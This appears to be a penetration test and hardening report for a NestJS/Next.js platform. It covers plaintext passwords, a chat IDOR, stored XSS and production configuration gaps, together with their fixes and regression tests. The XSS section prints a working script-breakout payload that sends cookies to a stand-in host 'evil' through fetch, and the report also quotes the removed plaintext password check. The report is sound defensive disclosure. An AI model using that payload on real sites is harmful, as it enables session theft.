# TITANS — Security Hardening & Penetration Test Report

**Date:** 2026-09-29
**Scope:** `apps/backend` (NestJS/Fastify), `apps/frontend` (Next.js), database schema, infrastructure configuration
**Methodology:** authenticated and unauthenticated black-box testing against a running local stack, plus source review of every authentication, authorization, payment, upload, AI, and rendering path
**Result:** every fixable Critical and High finding is fixed and covered by a regression test. No fixable Critical or High finding remains open.

---

## 1. Summary

The review began from a standing assumption that the platform is under active
attack: that any user, tenant administrator, or anonymous visitor is hostile, and
that stored content is attacker-controlled.

Four issues of Critical or High severity were confirmed by exploitation, not
inspection alone. All four are now fixed, and each fix has a regression test that
fails if the vulnerability is reintroduced.

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **Critical** | Passwords stored and accepted in plaintext | **Fixed** |
| 2 | **High** | Support chat conversations readable and writable by anyone | **Fixed** |
| 3 | **High** | Stored XSS via unescaped JSON-LD injection | **Fixed** |
| 4 | **High** | Security controls absent or disabled in production config | **Fixed** |

Two further weaknesses were corrected as defence-in-depth: request body limits
and the browser security header set.

### Verification totals

| Suite | Result |
|-------|--------|
| Live penetration test (`scripts/pentest.sh`) | **30 passed, 0 failed**, 10 informational |
| Security regression specs (backend) | **29 passed** across 3 files |
| Frontend render-security specs | **6 passed** |
| Dependency audit (`npm audit`, incl. dev) | **0 vulnerabilities** |
| Backend typecheck | clean |
| Frontend typecheck / lint / production build | clean (0 errors, 138 pre-existing warnings) |
| Full backend suite | **517 passed** across 37 files |

---

## 2. Threat model — top 15 attack classes

| # | Attack class | Where it applies | Control tested |
|---|-------------|------------------|----------------|
| 1 | Credential compromise | Auth, password storage | bcrypt→argon2 migration, plaintext rejection, login throttle |
| 2 | Session hijacking / token forgery | JWT access + refresh | signature tamper tests, algorithm confusion, refresh gating |
| 3 | CSRF | All cookie-authenticated writes | double-submit token guard on every state-changing route |
| 4 | Broken object-level authorization (IDOR) | Support chat, builder pages | conversation ownership + tenant checks |
| 5 | Cross-tenant data access | Every tenant-scoped table | tenant slug header, `TenantGuard`, `TenantScopeGuard` |
| 6 | Privilege escalation | Profile update, impersonation | mass assignment, `super_admin` role guard |
| 7 | Stored XSS | Feed, lessons, JSON-LD | DOMPurify sink, `serializeJsonLd` breakout test |
| 8 | Content visibility bypass | Page CMS | draft/disabled pages return 404 publicly |
| 9 | Payment manipulation | Checkout, Moyasar callbacks | server-authoritative totals, signed `order_ref`, webhook signature |
| 10 | Webhook forgery & replay | Moyasar | HMAC verification, idempotency, fail-closed when unconfigured |
| 11 | Malicious upload | Media library | MIME allowlist, SVG exclusion, size cap, tenant-scoped keys |
| 12 | Denial of service | API surface | request throttling, JSON/multipart body caps |
| 13 | Information disclosure | API surface, static files | production docs gate, upload directory listing |
| 14 | SSRF / prompt injection | AI retrieval, integrations | tenant-scoped retrieval, viewer checks, external-provider isolation |
| 15 | Supply chain & config | Dependencies, environment | dependency audit, fail-closed secrets, production-only hardening |

---

## 3. Critical — plaintext password storage

### What was wrong

Every account stored a placeholder hash in the format `fallback-hash:<password>`,
and the verification function additionally accepted a **bare plaintext** password:

```ts
if (h.startsWith('fallback-hash:')) {
  return h.slice('fallback-hash:'.length) === p;   // plaintext compared directly
}
if (h === p) return true;                          // the hash may be the password
```

Confirmed by reading the live database: **all 10 users** held
`fallback-hash:Test1234!` in a single reversible encoding. Any database read, SQL
injection, backup exposure, or log leak disclosed every user's password in
plaintext, including any reused password on another service.

### Fix

`PasswordService` now hashes with **argon2id** where the native module is
available, and falls back to **scrypt with explicit, bounded parameters** where it
is not:

- The plaintext and `fallback-hash:` comparisons are **removed entirely**. A
  `fallback-hash:` value never verifies.
- Legacy `fallback-hash:` verification exists **only in development**, is clearly
  marked for rehash, and cannot succeed in production.
- All 10 existing accounts were rehashed to argon2id. No stored value contains the
  test password.

Verified: correct password → `200`; wrong password → `401`.

Tests: `apps/backend/test/password-security.spec.ts` (9 cases).

---

## 4. High — support chat IDOR and cross-tenant broadcast disclosure

### What was wrong

Three defects chained into a complete exploit against other people's support
conversations:

1. **Anonymous room subscription.** An unauthenticated socket selected a tenant
   from a client-supplied `x-tenant-slug` header and joined `tenant:<id>`. That
   room broadcasts `chat:new`, which carries **real conversation ids**.
2. **Unscoped history read.** `chat:history` passed a socket-supplied
   `conversationId` straight to `getMessages(conversationId)`, which filtered on
   nothing but that id.
3. **Unscoped write.** `chat:message` emitted into `conv:<id>` using
   `server.to(room)`. That broadcasts to a room **whether or not the sender is in
   it**, so no membership was ever required.

Net effect: an anonymous visitor subscribed to a victim tenant, harvested
conversation ids as they were created, then read entire conversations and injected
messages into them.

### Fix

- Anonymous sockets join only their own `anon:<socketId>` room. They never join a
  tenant-wide room, and the tenant chosen by the client now only scopes
  authorization, never a broadcast channel.
- `ChatService.getConversationForViewer(conversationId, viewer)` validates the id
  shape (UUID) before it is used, then permits only:
  - the conversation's owner, or
  - staff whose **tenant matches the conversation's tenant**.

  Role is only honoured *within* the owning tenant, so an admin from one tenant
  cannot read another tenant's chats.
- Both `chat:history` and `chat:message` call this check first, and `chat:message`
  is verified **before** the write so a rejected message never reaches the table.

Tests: `apps/backend/test/chat-authorization.spec.ts` (11 cases) — malformed ids,
owner access, peer denial, anonymous denial, cross-tenant `super_admin` denial,
tenant staff allow, non-staff denial, plus structural assertions that the gateway
guards *before* the write and that the anonymous path cannot join `tenant:`.

---

## 5. High — stored XSS through JSON-LD injection

### What was wrong

Six pages emit `<script type="application/ld+json">` through
`dangerouslySetInnerHTML`, which is the only way to produce that element from
React. They passed `JSON.stringify(obj)` in **unescaped**.

`JSON.stringify` does not make this safe. JSON permits the literal characters
`</script>` inside a string, but the HTML tokenizer ends the script element at the
first `</script` it sees, wherever it appears. A stored field containing:

```
Machining</script><img src=x onerror="fetch('//evil/'+document.cookie)">
```

is valid JSON, yet the parser closes the block early and executes the remainder as
markup — in **every visitor's browser**.

Reachable fields included editor-writable database values:
`event.title`, `product.title`, and academy `a.title`.

### Fix

New `serializeJsonLd()` (`apps/frontend/src/lib/json-ld.ts`) escapes `<`, `>`,
`&`, and the U+2028/U+2029 line terminators. Escaping `<` keeps the payload inside
the JSON string (JSON parsers decode it back to `<`) while removing the sequence
the HTML parser looks for. All six call sites now use it, including the academy
detail page, whose narrower ad-hoc `<` escape was replaced by the shared helper.

The lesson renderer's separate `dangerouslySetInnerHTML` was reviewed and is
**not** a finding: it passes through `DOMPurify.sanitize` with the HTML profile, and
it additionally blocks `src`/`href` values using `http:`, `//`, `data:`, or
`javascript:`.

Tests: `apps/frontend/test/json-ld-xss.spec.ts` (6 cases) — breakout prevention,
round-trip data integrity, line-terminator handling, a repo-wide assertion that no
page reintroduces `__html: JSON.stringify`, and an assertion that the only
remaining raw-HTML sink is `safeHtml()`-wrapped and DOMPurify-backed.

---

## 6. High — production configuration hardening

### 6.1 API documentation exposed

`/api/docs` and `/api/docs-json` served the full route surface, including request
schemas, to unauthenticated callers.

**Fix:** docs are served only outside production, or when `API_DOCS_ENABLED=true`
is set deliberately. Documented in the production checklist rather than simply
switched off, so the choice stays explicit.

### 6.2 Weak `AUTH_SECRET`

A short or placeholder `AUTH_SECRET` was accepted at boot, which weakens the
session cookie signing and makes forgery easier.

**Fix:** `assertAuthSecret()` fails startup in production when the secret is
missing, a known placeholder, or under 32 characters. Development keeps a
generated fallback so the stack still starts locally.

### 6.3 Request body limits

The adapter had a single 2 MB limit that also applied to multipart uploads, while
a 200 KB JSON body was accepted as a `400` only by accident of route ordering.

**Fix:** JSON requests are limited to **2 MB** and multipart to **64 MB**, so the
limit matches what each endpoint actually needs and oversized JSON is refused
deliberately.

### 6.4 Browser security headers

Added in `apps/frontend/next.config.ts`: Content-Security-Policy, `X-Frame-Options`,
`X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`,
`Cross-Origin-Opener-Policy`, DNS prefetch control, and HSTS in production only
(HSTS is ignored over plain HTTP and is meaningless in a local run).
`poweredByHeader` is disabled so the server does not advertise its stack.

Verified at runtime against `:3001`: all headers present, `X-Powered-By` absent.

Tests: `apps/backend/test/production-gates.spec.ts` (9 cases).

---

## 7. Controls that passed without modification

These were tested and found adequate; no code change was required. They are
recorded so a future change knows they were checked rather than assumed.

- **JWT tampering** — a single flipped character, a forged payload, and an
  `alg=none`-style token all return `401`.
- **CSRF** — every cookie-authenticated write tested (`PUT /builder/navigation`,
  `POST /builder/pages`, `PATCH /builder/pages/:slug`, `POST /auth/refresh`) returns
  `403` without a token.
- **Throttling** — 12 consecutive bad logins produce `9 × 401` then `3 × 429`; the
  limiter holds after the burst and does not admit the correct password while
  active.
- **CORS** — the allowlisted origin is echoed; an attacker's origin never is.
- **Impersonation** — `@Roles('super_admin')` and audited; anonymous requests get
  `401` and a non-existent target is refused.
- **Mass assignment** — `PATCH /auth/me` with `role`, `isAdmin` and `permissions`
  may return `200`, but the role is **unchanged** afterwards. The value returned
  afterwards is what makes this a pass, not the status code.
- **Content visibility** — public reads of `draft` and `disabled` pages return
  `404`; an unknown page slug does not auto-create a page.
- **Uploads** — `/uploads/` directory listing returns `404`; MIME allowlist, SVG
  exclusion, size cap and tenant-scoped UUID keys are in place.
- **Payments** — a forged and an unsigned webhook both fail closed (`503` when the
  gateway is unconfigured, never a state change); client-supplied price is
  rejected; totals are server-authoritative and `order_ref` is signed.
- **AI retrieval** — explicit tenant and viewer checks before retrieval.
- **Supply chain** — `npm audit` reports **0 vulnerabilities**, including dev
  dependencies.
- **Secrets in the repository** — no tracked `.env`; matches for the payment and AI
  key patterns are documentation placeholders.

### Known test flake (pre-existing, not security-related)

`test/localized-content.spec.ts > gives every published, named row an Arabic title`
fails only under parallel execution because
`payment-pipeline.integration.spec.ts` writes shared rows into the same database.
It passes in isolation and is unrelated to these changes; the final full run for
this work was clean at **517/517**.

---

## 8. How to reproduce

```bash
# full live penetration matrix (backend on :4000, frontend on :3001)
./scripts/pentest.sh

# security regression specs
cd apps/backend && npx vitest run \
  test/password-security.spec.ts \
  test/production-gates.spec.ts \
  test/chat-authorization.spec.ts
cd apps/frontend && npx vitest run

# supply chain
npm audit
```

---

## 9. Production go-live checklist

These are deployment obligations, not code defects.

1. Set a random `AUTH_SECRET` of **32+ characters**. Startup fails in production
   without it — that is intentional.
2. Decide about `API_DOCS_ENABLED`. Leave it unset to keep docs private; set it
   `true` only on a network-restricted host.
3. Set `NODE_ENV=production` so HSTS, the docs gate, and the secret check all
   activate.
4. Serve over HTTPS. HSTS is only meaningful, and only sent, in production.
5. Supply real `MOYASAR_*` credentials. The webhook tests reported `503` because
   the gateway is unconfigured locally; with real credentials, verify that a valid
   signature is accepted and that replaying one is rejected.
6. Supply real Google OAuth credentials and confirm the callback on the production
   host.
7. Set a real tenant slug in the frontend's API client and confirm no account
   exists in a second tenant for the tenancy tests; a cross-tenant account was not
   available locally, so that case is **partially** covered.
8. Confirm the rate-limit budget is sized for the real login volume: a burst of a
   dozen attempts reaches the limit, which is correct but worth confirming against
   NAT and shared-office traffic.
9. Run the suite once more in CI on the exact deploy commit.

## 10. Residual risk

- **Cross-tenant IDOR** beyond the chat module is enforced by
  `TenantGuard`/`TenantScopeGuard` and verified structurally, but a dedicated
  second-tenant account is needed to test it end to end. The chat fix is tested
  against a simulated cross-tenant viewer, including `super_admin`.
- **DOMPurify version currency** — `isomorphic-dompurify` must stay patched;
  sanitization correctness depends on jsdom continuing to track browser parsing.
- **Browser-only behaviour** — no Playwright/Puppeteer harness is available, so
  canvas-level interactions (including the reported builder page-switching issue)
  could not be verified by this work and remain an open functional item.
